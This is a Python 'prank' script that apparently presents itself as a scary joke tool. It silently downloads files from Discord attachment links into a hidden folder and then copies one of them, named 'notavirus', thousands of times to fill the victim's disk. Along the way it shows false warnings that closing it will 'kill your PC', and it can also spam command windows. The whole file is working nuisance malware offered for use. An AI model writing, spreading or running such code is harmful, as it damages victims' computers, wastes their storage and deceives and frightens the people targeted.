import sys
import threading
import pystyle
from pystyle import Colorate, Colors
import os
import requests
import json
import time
from time import sleep
import random
from random import randint
import ctypes
from threading import Thread

############################################
#               CONFIG                     #
############################################
scaryspam = False
spamcmd = False
individualload = True
showghostface = True
threadmode = False

def install(package):
    os.system(f"{sys.executable} -m pip install {package}")

try:
    import shutil
except ModuleNotFoundError:
    install("shutil")

try:
    import requests
except ModuleNotFoundError:
    install("requests")

try:
    import pystyle
except ModuleNotFoundError:
    install("pystyle")

try:
    import json
except ModuleNotFoundError:
    install("json")

try:
    import json
except ModuleNotFoundError:
    install("json")

try:
    import playsound
except ModuleNotFoundError:
    install("playsound")

try:
    import tkinter as tk
except ModuleNotFoundError:
    install("tk")

from playsound import playsound

cmd = 'mode 50,50'
os.system(cmd)
os.system("title Loading...")

ghostface = """

⠀⠈⠀⠀⠳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣄⣤⣶⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⠋⠁⠀⠀⠈⠻⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣦⣤⡀⠀⠀⠀⠀⠀⢠⣿⣿⣿⡏⠀⠊⠀⠀⠀⠀⠸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⢀⣾⣿⣟⠥⢖⣧⣾⣿⠀⣀⣤⠀⠘⠿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣼⣿⡟⢡⣾⣿⣿⡿⠃⠀⢸⣿⣇⠀⢸⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣰⣿⣿⡗⠈⠙⠛⡉⠔⠁⠀⢸⣿⣿⣆⠈⣿⣿
⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⢰⣿⣿⣿⣿⣷⠀⠁⠴⠾⣿⡄⠀⠛⠿⠿⠂⢸⣿
⠿⣿⠻⠿⠿⣿⠆⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⠀⠀⣀⣀⠀⠀⠀⠢⢀⣀⣠⣾⣿
⠀⠸⠀⠀⢀⠆⠀⠀⠀⠀⠀⢘⣿⣿⣿⣿⣟⣌⣾⣿⣿⣿⡄⠀⠀⢠⣾⣿⣿⣿
⣀⡀⠀⠀⠈⠀⠀⠀⠀⢀⣰⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⠃⠀⢀⣿⣿⣿⣿⣿
⣿⣧⠀⠀⠀⣿⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⣿⣿⠏⣠⣴⣿⣿⣿⣿⣿⣿
⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⡟⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣇⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠻⢟⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣆⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿



"""
if showghostface:
    print("")
    print(Colorate.Diagonal(Colors.rainbow,ghostface, 1))
    print("")
    print(Colorate.Diagonal(Colors.red_to_white,"What's your favorite scary movie?", 1))
    time.sleep(1)
    os.system("cls")
else:
    pass

print(Colorate.Diagonal(Colors.red_to_white,"This tool was made by:", 1))
print(Colorate.Diagonal(Colors.red_to_white,"GitHub: DEV-S4M", 1))
print(Colorate.Diagonal(Colors.red_to_white,"Discord: sam.#9999", 1))
time.sleep(1.5)
os.system("cls")


print(Colorate.Horizontal(Colors.rainbow,"$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n\n", 1))
print(Colorate.Horizontal(Colors.green_to_white,"Welcome to the program, You MUST wait...\n\n", 1))
time.sleep(1)
print(Colorate.Horizontal(Colors.green_to_white,"The program will now load...\n\n", 1))
print("")
print(Colorate.Horizontal(Colors.red_to_yellow,"Note: Closing this will kill your PC...\n\n", 1))
print("")
print(Colorate.Horizontal(Colors.blue_to_purple,"Downloading all files...\n\n", 1))
time.sleep(2)
os.system("cls")

if scaryspam:
    def scary_spam():
        print(Colorate.Horizontal(Colors.blue_to_purple,"Did you hear that??? They're coming...\n\n", 1))
        time.sleep(0.1)
    count = 0
    while (count < 30):
        count = count + 1
        scary_spam()
    os.system("cls")
else:
    pass

def download_files():
    time.sleep(1)
    os.system(f"title {random.randint(1, 100000)} - Made by DEV_S4M on GitHub")
    if not os.path.exists('./data/'): os.makedirs('./data/')
    FILE_ATTRIBUTE_HIDDEN = 0x02
    ret = ctypes.windll.kernel32.SetFileAttributesW("./data/", FILE_ATTRIBUTE_HIDDEN)
    if not os.path.isfile(f'./data/popup.py'): open(f'./data/popup.py', 'wb').write(requests.get('https://cdn.discordapp.com/attachments/1068625802465386496/1089654576208154664/popup.py', allow_redirects=True).content)
    if not os.path.isfile(f'./data/notavirus'): open(f'./data/notavirus', 'wb').write(requests.get('https://cdn.discordapp.com/attachments/1066222613812232233/1089270717847191552/1.txt', allow_redirects=True).content)
    if not os.path.exists('./data/sounds'): os.makedirs('./data/sounds')
    time.sleep(1)


def ear_rape():
    playsound('./data/sounds/lol.mp3')

def make_folders():
    if not os.path.exists(f'./data/fucked-{random.randint(1, 10000000000000000000000000)}'): os.makedirs(f'./data/fucked-{random.randint(1, 10000000000000000000000000)}')

def spam_files():
    shutil.copyfile(f'./data/notavirus', f'./data/notavirus-{random.randint(1, 10000000)}')

def popup():
    ctypes.windll.user32.MessageBoxW(0, "That's an error", "Warning!", 16)

def open_cmd():
    count = 0
    while (count < 10):
        count = count + 1
        os.system("start cmd")

def notif():
        print("")
        if individualload:
            print(Colorate.Horizontal(Colors.green_to_white,f"Downloaded notavirus-{random.randint(1, 100000)} successfully!\n\n", 1))
            print(Colorate.Horizontal(Colors.red_to_yellow,"- Note: Closing this will kill your PC...\n\n", 1))
        else:
            print(Colorate.Horizontal(Colors.green_to_white,f"Downloading Files...\n\n", 1))

download_files()

if threadmode:
    count = 0
    while (count < 10000):
        count = count + 1
        if __name__ == '__main__':
            Thread(target = make_folders).start()
            Thread(target = spam_files).start()
            Thread(target = notif).start()
        if spamcmd:
            open_cmd()
        else:
            pass
else:
    count = 0
    while (count < 10000):
        count = count + 1
        make_folders()
        spam_files()
        notif()
        if spamcmd:
            open_cmd()
        else:
            pass

input(Colorate.Horizontal(Colors.red_to_yellow,"\nIf you made it here, you have a lot of storage... Press enter to close.", 1))
